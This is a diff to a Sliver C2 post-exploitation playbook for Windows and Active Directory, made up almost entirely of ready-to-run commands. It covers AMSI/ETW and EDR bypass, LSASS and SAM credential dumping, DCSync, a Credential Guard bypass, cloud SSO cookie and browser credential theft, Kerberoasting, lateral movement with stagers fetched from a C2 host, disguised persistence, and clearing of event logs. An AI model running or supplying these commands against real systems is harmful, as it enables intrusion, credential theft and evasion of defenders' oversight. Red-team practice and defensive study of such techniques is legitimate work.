@@ -112,127 +112,278 @@ sliver (IMPLANT) > rev2self                        # Revert impersonation
 
 ## Post-Exploitation Playbook
 
-### Install BOF Extensions (One-Time)
+### Armory Setup (One-Time Per Client)
 
-Sliver's armory provides BOFs (Beacon Object Files) that run in-process — no exe dropped to disk.
+Sliver's armory provides BOFs and .NET aliases that run in-process. Install by bundle for speed.
 
 ```
-sliver > armory                                    # List all available extensions
-sliver > armory install sa-whoami                   # AD user/group enumeration
-sliver > armory install sa-netlocalgroup            # Local group membership
-sliver > armory install nanodump                    # LSASS memory dump
-sliver > armory install bof-credentials             # Credential harvesting BOFs
-sliver > armory install bof-registry                # Registry operations
-sliver > armory install sharp-hound-4               # BloodHound collection
+sliver > armory                                     # List everything available
+sliver > armory update                              # Update installed packages
+
+# ─── Install bundles (each installs multiple tools) ───
+sliver > armory install windows-credentials          # nanodump, credman, mimikatz, handlekatz, chromiumkeydump, go-cookie-monster
+sliver > armory install kerberos                     # bof-roast, nanorobeus, c2tc-kerberoast, tgtdelegation, delegationbof, kerbrute
+sliver > armory install situational-awareness        # All 52+ sa-* BOFs (sa-whoami, sa-netstat, sa-ldapsearch, etc.)
+sliver > armory install c2-tool-collection           # All 18 c2tc-* BOFs (c2tc-domaininfo, c2tc-lapsdump, etc.)
+sliver > armory install cs-remote-ops-bofs           # All 35+ remote-* BOFs (remote-procdump, remote-sc-create, etc.)
+sliver > armory install windows-pivot                # scshell, bof-servicemove, winrm, jump-wmiexec, jump-psexec
+sliver > armory install windows-bypass               # inject-etw-bypass, inject-amsi-bypass, unhook-bof, patchit
+sliver > armory install .net-recon                   # seatbelt, sharpup, sharpview, sharp-hound-4
+sliver > armory install .net-execute                 # sharp-smbexec, sharp-wmi, sharpmapexec, sharprdp, nps
+sliver > armory install .net-pivot                   # rubeus, certify, sharpsecdump, sharpdpapi, sharpchrome, sharplaps, krbrelayup, sqlrecon
+```
+
+### Evasion — Run First
+
+```
+# Bypass AMSI + ETW before running .NET assemblies
+sliver (IMPLANT) > inject-amsi-bypass                # Patch AmsiScanBuffer
+sliver (IMPLANT) > inject-etw-bypass                 # Patch EtwEventWrite
+sliver (IMPLANT) > unhook-bof                        # Unhook ntdll from EDR
 ```
 
 ### Credential Dumping — LSA Secrets & SAM
 
-**Requires:** High integrity (Run as Administrator)
+**Requires:** High integrity (run implant as Administrator)
 
 ```
-# ─── Dump LSASS with nanodump (most evasive) ───
-sliver (IMPLANT) > nanodump -w C:\Windows\Temp\debug.dmp
-# Download the dump, then on Kali: pypykatz lsa minidump debug.dmp
+# ─── nanodump (LSASS dump, most evasive — BOF, in-process) ───
+sliver (IMPLANT) > nanodump -- --write C:\Windows\Temp\debug.dmp --valid
+# On Kali: pypykatz lsa minidump debug.dmp
 
-# ─── SAM + SECURITY + SYSTEM hive extraction ───
-sliver (IMPLANT) > execute -o reg save HKLM\SAM C:\Windows\Temp\sam
-sliver (IMPLANT) > execute -o reg save HKLM\SECURITY C:\Windows\Temp\security
-sliver (IMPLANT) > execute -o reg save HKLM\SYSTEM C:\Windows\Temp\system
-sliver (IMPLANT) > download C:\Windows\Temp\sam
-sliver (IMPLANT) > download C:\Windows\Temp\security
-sliver (IMPLANT) > download C:\Windows\Temp\system
-# On Kali: secretsdump.py -sam sam -security security -system system LOCAL
+# ─── handlekatz (LSASS via handle duplication — avoids direct open) ───
+sliver (IMPLANT) > handlekatz
 
-# ─── In-memory with execute-assembly (SharpSecDump) ───
-sliver (IMPLANT) > execute-assembly /opt/tools/SharpSecDump.exe -target=localhost
-# Dumps SAM, LSA secrets, and cached domain creds — no files touch disk
+# ─── mimikatz (reflectively loaded — full mimikatz in-memory) ───
+sliver (IMPLANT) > mimikatz sekurlsa::logonpasswords  # All plaintext/NTLM/Kerberos creds
+sliver (IMPLANT) > mimikatz lsadump::sam              # SAM database
+sliver (IMPLANT) > mimikatz lsadump::secrets          # LSA secrets (service account passwords)
+sliver (IMPLANT) > mimikatz lsadump::cache            # Cached domain credentials (DCC2)
+sliver (IMPLANT) > mimikatz lsadump::dcsync /user:DOMAIN\krbtgt  # DCSync (DA required)
 
-# ─── LSA Whisper — extract LSA secrets via BOF ───
-sliver (IMPLANT) > sa-netlocalgroup                 # Enumerate local admins first
-sliver (IMPLANT) > execute-assembly /opt/tools/SharpLSA.exe       # Dump LSA secrets
-# Or use mimikatz BOF:
-sliver (IMPLANT) > execute -o "cmd.exe /c rundll32.exe" -ppid 5056  # Under svchost
+# ─── credman (Credential Manager via token manipulation — BOF) ───
+sliver (IMPLANT) > credman <target_user_pid>          # Dump saved Windows credentials
+
+# ─── sharpsecdump (remote SAM/LSA/cached creds — .NET, no files on disk) ───
+sliver (IMPLANT) > sharpsecdump -- -target=localhost
+sliver (IMPLANT) > sharpsecdump -- -target=DC01       # Remote dump with admin access
+
+# ─── sharpdpapi (DPAPI master keys + credential blobs) ───
+sliver (IMPLANT) > sharpdpapi -- machinecredentials   # Machine DPAPI secrets
+sliver (IMPLANT) > sharpdpapi -- triage               # All user DPAPI blobs
+
+# ─── SAM + SECURITY + SYSTEM hive extraction (manual) ───
+sliver (IMPLANT) > execute -o reg save HKLM\SAM C:\Windows\Temp\s
+sliver (IMPLANT) > execute -o reg save HKLM\SECURITY C:\Windows\Temp\se
+sliver (IMPLANT) > execute -o reg save HKLM\SYSTEM C:\Windows\Temp\sy
+sliver (IMPLANT) > download C:\Windows\Temp\s
+sliver (IMPLANT) > download C:\Windows\Temp\se
+sliver (IMPLANT) > download C:\Windows\Temp\sy
+# On Kali: secretsdump.py -sam s -security se -system sy LOCAL
+
+# ─── hashdump (built-in Sliver — quick SAM hash dump) ───
+sliver (IMPLANT) > hashdump
+
+# ─── procdump (built-in Sliver — dump any process memory) ───
+sliver (IMPLANT) > procdump -n lsass.exe -s /tmp/lsass.dmp
+```
+
+### LSA Whisperer — Credential Guard Bypass
+
+[LSA Whisperer](https://github.com/EvanMcBroom/lsa-whisperer) by SpecterOps extracts credentials even with **Credential Guard enabled** by talking directly to LSA authentication packages via LSASS's public API. Not in armory — manual BOF load required.
+
+```bash
+# ─── Setup on Kali ───
+git clone https://github.com/EvanMcBroom/lsa-whisperer.git /opt/tools/lsa-whisperer
+cd /opt/tools/lsa-whisperer && mkdir build && cd build
+cmake .. -DCMAKE_BUILD_TYPE=Release && make
+# Produces: lsa-whisperer.exe (standalone) and BOF .o files
+```
+
+```
+# ─── From Sliver session (standalone exe via execute-assembly) ───
+sliver (IMPLANT) > execute-assembly /opt/tools/lsa-whisperer/build/lsa-whisperer.exe --msv
+
+# ─── MSV1_0 module (DPAPI keys + NTLM — works WITH Credential Guard) ───
+# These extract DPAPI credential keys that Credential Guard normally protects:
+lsa-credkey                          # Current session DPAPI credential key
+lsa-credkey 0x3e7                    # SYSTEM session DPAPI key (LUID)
+lsa-strongcredkey                    # Strong DPAPI key (Win10+)
+lsa-ntlmv1 0x3e7 1122334455667788   # NTLMv1 response for cracking
+
+# ─── Kerberos module (ticket extraction) ───
+lsa-klist                            # List cached Kerberos tickets
+lsa-klist /all                       # All sessions (needs SYSTEM)
+lsa-dump                             # Dump all tickets as base64 .kirbi
+lsa-dump 0x3e7                       # Dump specific session tickets
+lsa-purge                            # Purge tickets
+
+# ─── CloudAP module (Azure AD / Entra ID — cloud SSO token theft) ───
+lsa-ssocookie                        # Extract Entra ID PRT SSO cookie
+lsa-devicessocookie                  # Device-bound SSO cookie
+lsa-enterprisesso                    # AD FS enterprise SSO cookie
+lsa-cloudinfo                        # Cloud provider info, TGT/DPAPI status
 ```
 
 ### Kerberoasting
 
-**Requires:** Domain-joined machine, any domain user token
+**Requires:** Any domain user token
 
 ```
-# ─── Rubeus Kerberoast (execute-assembly, runs in-memory) ───
-sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /outfile:C:\Windows\Temp\hashes.txt
-sliver (IMPLANT) > download C:\Windows\Temp\hashes.txt
-# On Kali: hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+# ─── nanorobeus (BOF Rubeus — runs in-process, no .NET needed) ───
+sliver (IMPLANT) > nanorobeus kerberoast /spn:MSSQLSvc/db01.corp.local:1433
+sliver (IMPLANT) > nanorobeus klist                   # List cached tickets
+sliver (IMPLANT) > nanorobeus klist /all              # All sessions
+sliver (IMPLANT) > nanorobeus dump /all               # Dump all tickets as base64 kirbi
+sliver (IMPLANT) > nanorobeus ptt /ticket:<base64>    # Pass-the-ticket
+sliver (IMPLANT) > nanorobeus tgtdeleg /spn:cifs/dc01.corp.local  # TGT delegation trick
 
-# ─── Rubeus Kerberoast — specific high-value SPNs ───
-sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /spn:MSSQLSvc/db01.corp.local:1433
-sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /user:svc_sql /nowrap
-# /nowrap gives you a single-line hash — easier to copy
+# ─── bof-roast (Kerberoast BOF) ───
+sliver (IMPLANT) > bof-roast rdp/hostname.domain.local
 
-# ─── AS-REP Roasting (no pre-auth accounts) ───
-sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe asreproast /format:hashcat /outfile:C:\Windows\Temp\asrep.txt
-sliver (IMPLANT) > download C:\Windows\Temp\asrep.txt
-# On Kali: hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+# ─── c2tc-kerberoast (C2 Tool Collection BOF) ───
+sliver (IMPLANT) > c2tc-kerberoast roast svc_sql
 
-# ─── Targeted: find kerberoastable accounts first ───
-sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe kerberoast /stats
-# Shows all accounts with SPNs, encryption type, and password last set
-# Target accounts with RC4 (type 23) — faster to crack than AES
+# ─── rubeus (.NET — full kerberos toolkit) ───
+sliver (IMPLANT) > rubeus -- kerberoast /stats        # Find kerberoastable accounts
+sliver (IMPLANT) > rubeus -- kerberoast /format:hashcat /nowrap  # All SPNs, hashcat format
+sliver (IMPLANT) > rubeus -- kerberoast /user:svc_sql /nowrap    # Target specific account
+sliver (IMPLANT) > rubeus -- asreproast /format:hashcat /nowrap  # AS-REP roast (no preauth)
+# On Kali: hashcat -m 13100 hashes.txt rockyou.txt    # Kerberoast
+# On Kali: hashcat -m 18200 asrep.txt rockyou.txt     # AS-REP roast
+# Target RC4 (etype 23) accounts — much faster to crack than AES
 ```
 
 ### AD Enumeration
 
 ```
-# ─── BloodHound collection (in-memory) ───
-sliver (IMPLANT) > sharp-hound-4 -- -c All --outputdirectory C:\Windows\Temp --zipfilename bh.zip
+# ─── BloodHound collection (.NET, in-memory) ───
+sliver (IMPLANT) > sharp-hound-4 -- -c All --zipfilename bh.zip --outputdirectory C:\Windows\Temp
 sliver (IMPLANT) > download C:\Windows\Temp\bh.zip
-# Import into BloodHound GUI — find shortest path to DA
+# Import into BloodHound — find shortest path to DA
 
-# ─── Quick AD recon via BOFs ───
-sliver (IMPLANT) > sa-whoami                        # Current user + group memberships
-sliver (IMPLANT) > sa-netlocalgroup Administrators   # Who is local admin?
-sliver (IMPLANT) > execute -o "net group \"Domain Admins\" /domain"
-sliver (IMPLANT) > execute -o "nltest /dclist:corp.local"
-sliver (IMPLANT) > execute -o "nltest /domain_trusts"
+# ─── Situational awareness BOFs (fast, in-process, no .NET) ───
+sliver (IMPLANT) > sa-whoami                          # Current user + groups + privs
+sliver (IMPLANT) > sa-netlocalgroup Administrators    # Local admins
+sliver (IMPLANT) > sa-netuser admin /domain           # Domain user details
+sliver (IMPLANT) > sa-netgroup "Domain Admins" /domain  # DA members
+sliver (IMPLANT) > sa-netloggedon                     # Who's logged on
+sliver (IMPLANT) > sa-get-netsession                  # Network sessions
+sliver (IMPLANT) > sa-netshares \\\\DC01              # Remote shares
+sliver (IMPLANT) > sa-netview                         # Network computer discovery
+sliver (IMPLANT) > sa-ldapsearch "(&(objectClass=user)(servicePrincipalName=*))"  # SPNs
+sliver (IMPLANT) > sa-adcs-enum                       # AD Certificate Services
+sliver (IMPLANT) > sa-get-password-policy              # Password policy
+sliver (IMPLANT) > sa-driversigs                      # AV/EDR driver detection
+sliver (IMPLANT) > sa-ipconfig                        # Network interfaces
+sliver (IMPLANT) > sa-arp                             # ARP table
+sliver (IMPLANT) > sa-netstat                         # Active connections
+sliver (IMPLANT) > sa-sc-enum                         # Enumerate services
+sliver (IMPLANT) > sa-schtasksenum                    # Enumerate scheduled tasks
+sliver (IMPLANT) > sa-list_firewall_rules             # Firewall rules
+sliver (IMPLANT) > sa-enum-filter-driver              # EDR filter drivers
+sliver (IMPLANT) > sa-find-loaded-module              # Loaded DLLs (find EDR hooks)
+
+# ─── C2 Tool Collection BOFs ───
+sliver (IMPLANT) > c2tc-domaininfo                    # Domain info
+sliver (IMPLANT) > c2tc-lapsdump                      # LAPS passwords
+sliver (IMPLANT) > c2tc-psx                           # Extended process list
+sliver (IMPLANT) > c2tc-smbinfo DC01                  # SMB info (OS version, domain)
+
+# ─── .NET recon tools ───
+sliver (IMPLANT) > seatbelt -- -group=all             # Full security audit
+sliver (IMPLANT) > sharpup -- audit                   # Privesc vectors
+sliver (IMPLANT) > sharpview -- 'Get-DomainUser -AdminCount'  # PowerView .NET port
+sliver (IMPLANT) > certify -- find /vulnerable        # AD CS misconfigurations
+sliver (IMPLANT) > sharplaps -- /host:DC01 /target:WS01  # LAPS password retrieval
 ```
 
 ### Lateral Movement
 
 ```
-# ─── PsExec (built-in, drops a service binary) ───
-sliver (IMPLANT) > psexec -t TARGET_IP -s /tmp/beacon.bin
-# Uses named pipe pivot — new session calls back through current implant
+# ─── PsExec (built-in Sliver) ───
+# First create a service profile:
+sliver > profiles new --format service --skip-symbols --mtls C2_IP:8888 pivot-svc
+sliver (IMPLANT) > psexec -p pivot-svc TARGET_HOSTNAME
 
-# ─── WMI Execution (fileless) ───
-sliver (IMPLANT) > execute-assembly /opt/tools/SharpWMI.exe action=exec computername=TARGET command="powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://C2_IP/stager.ps1')"
+# ─── jump-psexec (BOF — no .NET, creates service) ───
+sliver (IMPLANT) > jump-psexec TARGET svcname /tmp/beacon.exe C:\Windows\Temp\svc.exe
 
-# ─── SMB Named Pipe Pivot (no new outbound connection) ───
-# Generate a pivot implant:
-sliver > generate beacon --named-pipe TARGET --os windows --arch amd64 --format shellcode --save /tmp/pivot.bin
-# Then from existing session:
-sliver (IMPLANT) > psexec -t TARGET_IP -s /tmp/pivot.bin
-# New beacon routes through the existing session's tunnel
+# ─── jump-wmiexec (BOF — WMI execution) ───
+sliver (IMPLANT) > jump-wmiexec TARGET 'powershell -ep bypass -c "IEX(curl http://C2/stager.ps1)"'
+
+# ─── sharp-wmi (.NET WMI execution) ───
+sliver (IMPLANT) > sharp-wmi -- action=exec computername=TARGET command="C:\Windows\Temp\beacon.exe"
+
+# ─── sharp-smbexec (.NET SMB execution) ───
+sliver (IMPLANT) > sharp-smbexec
+
+# ─── sharpmapexec (.NET — multi-protocol like CrackMapExec) ───
+sliver (IMPLANT) > sharpmapexec -- ntlm smb /target:192.168.1.0/24 /user:admin /ntlm:HASH /m:exec /a:"whoami"
+
+# ─── winrm (BOF — WinRM execution) ───
+sliver (IMPLANT) > winrm
+
+# ─── scshell (service config lateral movement) ───
+sliver (IMPLANT) > scshell
+
+# ─── sharprdp (.NET — RDP command execution without GUI) ───
+sliver (IMPLANT) > sharprdp
 
 # ─── Token Impersonation + Lateral ───
-sliver (IMPLANT) > steal-token 1234                 # Steal DA token from process
-sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"     # Verify access
-sliver (IMPLANT) > psexec -t DC01 -s /tmp/beacon.bin  # Move to DC
+sliver (IMPLANT) > steal-token 1234                   # Steal DA token
+sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"      # Verify access
+sliver (IMPLANT) > psexec -p pivot-svc DC01            # Move to DC
+
+# ─── Pass-the-Hash / Over-Pass-the-Hash ───
+sliver (IMPLANT) > rubeus -- asktgt /user:admin /rc4:NTLM_HASH /ptt
+sliver (IMPLANT) > nanorobeus ptt /ticket:<base64>     # Inject ticket (BOF)
+sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"       # Verify ticket works
 
 # ─── RDP via SOCKS proxy ───
 sliver (IMPLANT) > socks5 start -p 1080
-# On Kali: proxychains xfreerdp /v:TARGET /u:admin /p:Password123 /cert-ignore
-# Or use the built-in rdp command:
-sliver (IMPLANT) > rdp -u admin -p Password123 --target TARGET_IP
+# On Kali: proxychains xfreerdp /v:TARGET /u:admin /p:Pass /cert-ignore
+# Or built-in:
+sliver (IMPLANT) > rdp -u admin -p Pass --target TARGET_IP
 
-# ─── Pass-the-Hash with Rubeus + Over-Pass-the-Hash ───
-sliver (IMPLANT) > execute-assembly /opt/tools/Rubeus.exe asktgt /user:admin /rc4:NTLM_HASH /ptt
-sliver (IMPLANT) > execute -o "dir \\\\DC01\\C$"     # Now works with the injected ticket
+# ─── SMB Named Pipe Pivot (routes through current session) ───
+sliver > generate beacon --named-pipe PIPE_NAME --os windows --arch amd64 --save /tmp/pivot.bin
+sliver (IMPLANT) > psexec -p pivot-svc TARGET          # New beacon pivots through you
 
-# ─── Azure RunCommand (for Azure VMs — no agent needed) ───
-# See AZURE-KILLCHAIN.md for the full guide
-# Quick version from Kali:
-./deploy-runcommand.sh --token ARM_TOKEN --sub SUB_ID --rg RG --vm VM --implant-url http://C2/implant.exe
+# ─── Remote ops BOFs (operate on remote machines directly) ───
+sliver (IMPLANT) > remote-sc-create TARGET svcname C:\Windows\Temp\beacon.exe
+sliver (IMPLANT) > remote-sc-start TARGET svcname
+sliver (IMPLANT) > remote-schtaskscreate TARGET taskname C:\Temp\beacon.exe
+sliver (IMPLANT) > remote-schtasksrun TARGET taskname
+
+# ─── Azure RunCommand (for Azure VMs — see AZURE-KILLCHAIN.md) ───
+./deploy-runcommand.sh --token ARM_TOKEN --sub SUB --rg RG --vm VM --implant-url URL
+```
+
+### AD CS (Certificate) Attacks
+
+```
+sliver (IMPLANT) > certify -- find /vulnerable        # Find vulnerable templates
+sliver (IMPLANT) > certify -- request /ca:CORP-CA /template:VulnTemplate /altname:administrator
+# Use cert for authentication:
+sliver (IMPLANT) > rubeus -- asktgt /user:administrator /certificate:cert.pfx /ptt
+sliver (IMPLANT) > sa-adcs-enum                       # BOF enumeration alternative
+```
+
+### Kerberos Relay & Delegation Attacks
+
+```
+sliver (IMPLANT) > krbrelayup                          # Kerberos relay privesc
+sliver (IMPLANT) > delegationbof 6 dc.domain.local     # Delegation abuse
+sliver (IMPLANT) > tgtdelegation                       # TGT extraction via delegation
+```
+
+### Browser & Application Credential Theft
+
+```
+sliver (IMPLANT) > chromiumkeydump                     # Chrome/Edge encryption key
+sliver (IMPLANT) > sharpchrome                         # Chrome passwords + cookies
+sliver (IMPLANT) > go-cookie-monster                   # Chrome cookies (App-Bound Key)
 ```
 
 ### Persistence
@@ -244,42 +395,71 @@ sliver (IMPLANT) > execute -o schtasks /create /tn "Microsoft\Windows\NetTrace\D
 # ─── Registry Run Key ───
 sliver (IMPLANT) > execute -o reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /t REG_SZ /d "C:\ProgramData\Microsoft\Network\svchost.exe" /f
 
-# ─── WMI Event Subscription (survives reboots, no files in startup) ───
-sliver (IMPLANT) > execute-assembly /opt/tools/SharpStay.exe action=WMIEvent eventname=DiagCheck command="C:\ProgramData\Microsoft\Network\svchost.exe"
+# ─── SharPersist (.NET — multiple persistence methods) ───
+sliver (IMPLANT) > sharpersist -- -t schtask -c "C:\ProgramData\Microsoft\Network\svchost.exe" -n "DiagCheck" -m add -o logon
+sliver (IMPLANT) > sharpersist -- -t reg -c "C:\ProgramData\Microsoft\Network\svchost.exe" -k "hklmrun" -v "DiagTrack" -m add
+sliver (IMPLANT) > sharpersist -- -t service -c "C:\ProgramData\Microsoft\Network\svchost.exe" -n "DiagSvc" -m add
+
+# ─── Remote persistence via BOF ───
+sliver (IMPLANT) > remote-schtaskscreate TARGET DiagCheck "C:\Temp\beacon.exe"
+sliver (IMPLANT) > remote-sc-create TARGET DiagSvc "C:\Temp\beacon.exe"
 ```
 
 ### Cleanup
 
 ```
-sliver (IMPLANT) > rev2self                         # Revert impersonation
+sliver (IMPLANT) > rev2self
 sliver (IMPLANT) > execute -o schtasks /delete /tn "Microsoft\Windows\NetTrace\DiagCheck" /f
 sliver (IMPLANT) > execute -o reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v DiagTrack /f
 sliver (IMPLANT) > rm C:\ProgramData\Microsoft\Network\svchost.exe
 sliver (IMPLANT) > rm C:\Windows\Temp\*.dmp
-sliver (IMPLANT) > rm C:\Windows\Temp\hashes.txt
 sliver (IMPLANT) > execute -o "wevtutil cl Security"
 sliver (IMPLANT) > execute -o "wevtutil cl System"
-sliver (IMPLANT) > exit                              # Kill the beacon
+sliver (IMPLANT) > execute -o "wevtutil cl Microsoft-Windows-PowerShell/Operational"
+sliver (IMPLANT) > exit
 ```
 
-### Tool Setup (Kali)
+### Kali Tool Setup
 
-Download the .NET assemblies used above:
 ```bash
-# Rubeus (Kerberoast, pass-the-hash, ticket ops)
-wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -O /opt/tools/Rubeus.exe
+mkdir -p /opt/tools
 
-# SharpSecDump (SAM + LSA + cached creds)
-wget https://github.com/G0ldenGunSec/SharpSecDump/releases/latest/download/SharpSecDump.exe -O /opt/tools/SharpSecDump.exe
+# LSA Whisperer (Credential Guard bypass — SpecterOps)
+git clone https://github.com/EvanMcBroom/lsa-whisperer.git /opt/tools/lsa-whisperer
 
-# SharpHound (BloodHound collector)
-wget https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe -O /opt/tools/SharpHound.exe
-
-# SharpWMI (WMI lateral movement)
-wget https://github.com/GhostPack/SharpWMI/raw/master/SharpWMI/bin/Release/SharpWMI.exe -O /opt/tools/SharpWMI.exe
-
-# Impacket (secretsdump, psexec, wmiexec from Kali)
+# Impacket (secretsdump, psexec, wmiexec, dcomexec, smbexec)
 pip3 install impacket
+
+# pypykatz (parse LSASS dumps offline)
+pip3 install pypykatz
+
+# BloodHound (graph-based AD analysis)
+pip3 install bloodhound
+# Or: apt install bloodhound
+
+# CrackMapExec / NetExec (network-wide credential testing)
+pip3 install netexec
+```
+
+### Armory Quick Reference
+
+| Bundle | Key Tools |
+|--------|-----------|
+| `windows-credentials` | nanodump, credman, mimikatz, handlekatz, chromiumkeydump, go-cookie-monster |
+| `kerberos` | nanorobeus, bof-roast, c2tc-kerberoast, tgtdelegation, delegationbof, kerbrute |
+| `situational-awareness` | 52+ sa-* BOFs (whoami, netstat, ldapsearch, adcs-enum, driversigs, etc.) |
+| `c2-tool-collection` | 18 c2tc-* BOFs (domaininfo, lapsdump, kerberoast, petitpotam, wdtoggle, etc.) |
+| `cs-remote-ops-bofs` | 35+ remote-* BOFs (remote-procdump, remote-sc-create, remote-reg-save, etc.) |
+| `windows-pivot` | jump-psexec, jump-wmiexec, winrm, scshell, bof-servicemove |
+| `windows-bypass` | inject-etw-bypass, inject-amsi-bypass, unhook-bof, patchit |
+| `.net-recon` | seatbelt, sharpup, sharpview, sharp-hound-4 |
+| `.net-execute` | sharp-smbexec, sharp-wmi, sharpmapexec, sharprdp, nps, sharpsh |
+| `.net-pivot` | rubeus, certify, sharpsecdump, sharpdpapi, sharpchrome, sharplaps, krbrelayup, sqlrecon |
+
+**Syntax note:** When running aliases with flags starting with `-`, use `--` separator:
+```
+# WRONG:  seatbelt -group=all
+# RIGHT:  seatbelt -- -group=all
 ```
 
 ---
